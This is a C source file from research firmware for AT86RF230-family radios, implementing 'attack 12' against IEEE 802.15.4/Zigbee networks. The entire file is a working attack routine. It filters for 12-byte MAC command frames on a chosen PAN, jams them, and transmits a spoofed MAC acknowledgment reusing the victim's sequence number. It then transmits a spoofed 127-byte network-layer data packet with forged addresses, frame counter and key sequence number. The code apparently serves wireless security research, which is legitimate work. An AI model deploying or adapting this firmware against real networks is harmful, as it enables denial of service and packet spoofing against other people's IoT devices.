/*
 * fw/attacks/attack_12.c - Attack function with ID 12
 *
 * Written 2021 by Dimitrios-Georgios Akestoridis
 * Copyright 2021 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/*
 * Jam only 12-byte MAC commands of a specified network
 * that request a MAC acknowledgment
 * and then spoof a MAC acknowledgment
 * followed by a 127-byte NWK Data packet
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t mac_seq_num = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	if (spi_recv() != 12) {
		/*
		 * Ignore packets whose length does not match
		 * the typical length of Data Requests
		 */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x07) != 0x03) {
		/* Ignore packets that are not MAC Command packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x20)) {
		/* Ignore packets that do not request a MAC acknowledgment */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte & 0x30) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2003 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x08) {
		/*
		 * Ignore packets that do not use a short address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0x80) {
		/*
		 * Ignore packets that do not use a short address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Store the MAC sequence number */
	_delay_us(32);
	mac_seq_num = spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(1);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed MAC acknowledgment */
	_delay_us(432);

	/* Spoof a MAC acknowledgment */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(5);
	spi_send(0x12);
	spi_send(0x00);
	spi_send(mac_seq_num);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed NWK Data packet */
	_delay_us(560);

	/* Spoof a NWK Data packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(127);
	spi_send(0x71);
	spi_send(0x88);
	spi_send(0xff);
	spi_send(PANID & 0xff);
	spi_send((PANID >> 8) & 0xff);
	spi_send(SHORTDSTADDR & 0xff);
	spi_send((SHORTDSTADDR >> 8) & 0xff);
	spi_send(SHORTSRCADDR & 0xff);
	spi_send((SHORTSRCADDR >> 8) & 0xff);
	spi_send(0x08);
	spi_send(0x02);
	spi_send(SHORTDSTADDR & 0xff);
	spi_send((SHORTDSTADDR >> 8) & 0xff);
	spi_send(SHORTSRCADDR & 0xff);
	spi_send((SHORTSRCADDR >> 8) & 0xff);
	spi_send(0x1e);
	spi_send(0xff);
	spi_send(0x28);
	spi_send(FRAMECOUNTER & 0xff);
	spi_send((FRAMECOUNTER >> 8) & 0xff);
	spi_send((FRAMECOUNTER >> 16) & 0xff);
	spi_send((FRAMECOUNTER >> 24) & 0xff);
	spi_send(EXTENDEDSRCADDR & 0xff);
	spi_send((EXTENDEDSRCADDR >> 8) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 16) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 24) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 32) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 40) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 48) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 56) & 0xff);
	spi_send(KEYSEQNUM);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
